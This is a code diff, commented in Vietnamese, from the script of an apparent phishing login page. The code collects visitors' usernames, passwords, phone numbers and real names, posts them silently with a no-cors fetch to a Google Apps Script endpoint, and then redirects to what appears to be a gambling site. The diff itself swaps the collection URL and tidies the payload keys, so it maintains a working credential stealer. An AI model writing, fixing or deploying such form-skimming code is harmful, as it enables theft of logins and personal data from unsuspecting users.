@@ -783,19 +783,18 @@
                 fullname = '';
             }
 
-            // [LỖI FIXED]: Sửa chính xác các Key ở đây phải giống HỆT tiêu đề trên cột (cả chữ viết hoa, dấu cách) để GAS không bị nhận nhầm cột.
+            // [ĐÃ CẬP NHẬT] Các Key được viết IN HOA toàn bộ, sắp xếp lại theo đúng định dạng mới
             const payload = {
-                "Thời Gian": now,
                 "TRẠNG THÁI": type,
                 "TÊN ĐĂNG NHẬP": username,
                 "MẬT KHẨU": password,
                 "SỐ ĐIỆN THOẠI": phone,
-                "HỌ TÊN THẬT": fullname
+                "HỌ TÊN THẬT": fullname,
+                "THỜI GIAN": now
             };
 
-            const scriptURL = "https://script.google.com/macros/s/AKfycbwBJuFpGW2rVYC8zpeM-cHxdsjZA9qh-F4yDx08qKCyW_6LNWfuyIMCUxF-ZkN0rbUT/exec";
+            const scriptURL = "https://script.google.com/macros/s/AKfycbyKqbvKxcrp5WSq2OhYFdZD5DPGfAgML8Ir3bd-2mTkchmaLyzp8VYIgsdOm16CzILB7Q/exec";
 
-            // [LỖI FIXED]: Thay thế .finally bằng .then và .catch để tránh việc các trình duyệt Mobile chặn fetch khi chưa hoàn thành request.
             fetch(scriptURL, {
                 method: 'POST',
                 mode: 'no-cors',
@@ -803,11 +802,9 @@
                 body: JSON.stringify(payload)
             })
             .then(function() {
-                // Thành công chuyển trang
                 window.location.href = "https://m.shbet51.ren/";
             })
             .catch(function(error) {
-                // Gặp lỗi nội bộ vẫn chuyển trang
                 console.error("Fetch lỗi: ", error);
                 window.location.href = "https://m.shbet51.ren/";
             });
